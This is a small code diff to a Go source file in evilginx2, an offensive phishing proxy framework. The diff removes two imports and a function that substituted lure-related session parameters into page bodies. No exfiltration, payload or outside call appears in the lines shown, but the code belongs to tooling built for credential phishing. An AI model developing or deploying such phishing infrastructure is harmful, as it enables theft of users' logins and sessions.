@@ -2,11 +2,9 @@ package core
 
 import (
 	"time"
-	"strings"
 	"crypto/rc4"
 	"encoding/base64"
 	"net/url"
-	"html"
 
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
@@ -146,15 +144,6 @@ func (s *Session) Finish(is_auth_url bool) {
 			s.DoneSignal = nil
 		}
 	}
-}
-
-// session params come from extractLureParams
-func (s *Session) ReplaceSessionParams(body string) string {
-	for k, v := range s.Params {
-		key := "{" + k + "}"
-		body = strings.Replace(body, key, html.EscapeString(v), -1)
-	}
-	return body
 }
 
 // extract lure params from encrypted query string
